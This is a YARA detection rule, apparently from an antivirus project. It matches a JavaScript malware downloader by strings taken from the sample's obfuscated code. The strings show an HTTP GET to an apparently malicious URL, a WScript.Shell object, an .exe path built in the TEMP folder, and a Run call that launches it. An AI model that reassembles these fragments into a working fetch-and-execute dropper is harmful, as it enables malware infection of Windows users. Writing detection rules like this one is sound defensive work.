rule sig_20160401_bb08b89b6bdd33d95df386cf30581090 {
  meta:
    description = "datamaliciousorder - file 20160401_bb08b89b6bdd33d95df386cf30581090.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d32fca725694d426430a83873a16564714a5b714754c975697fc75037ff08900"

  strings:
    $s1  = "AbhMsd[UpZq](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var HdXs = function FyjMo() {return WScript[QoRh](\"WScript\"+\".Shell\");}(), EmvYmg = 11;" fullword ascii
    $s3  = "function DipKr(EoAja, AzZu){RsAj = RsAj * 1; return EoAja - AzZu;};" fullword ascii
    $s4  = "if (AbhMsd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GdSm(){return AhLs + \"\";};" fullword ascii
    $s6  = "function ToBmh() {return HdXs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OGC663FAyzF.ex\" + \"e\";};" fullword ascii
    $s7  = "function OeXge() {return ((RqIgx == true) && (RqIgx == XoXjv)) ? 1 : RsAj;};" fullword ascii
    $s8  = "function AbfJco(){return 23;};" fullword ascii
    $s9  = "var YdThc = false;" fullword ascii
    $s10 = "var VniCr = new this[\"Date\"]();" fullword ascii
    $s11 = "function VmCy(SvpIbr){HdXs[\"R\"+\"un\"](SvpIbr, RsAj, RsAj);};" fullword ascii
    $s12 = "}while (GdiMfb);" fullword ascii
    $s13 = "var XoXjv = false;" fullword ascii
    $s14 = "RqIgx = true; " fullword ascii
    $s15 = "return DipKr(IkIiz, LduZh);" fullword ascii
    $s16 = "function ZlJu()" fullword ascii
    $s17 = "function EkBi(GlYu) {var CqkNh = (1, 2, 3, 4, 5, GlYu); return CqkNh;};" fullword ascii
    $s18 = "function PuWo(){return QoRh;};" fullword ascii
    $s19 = "var RqIgx = false;" fullword ascii
    $s20 = "XoXjv = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}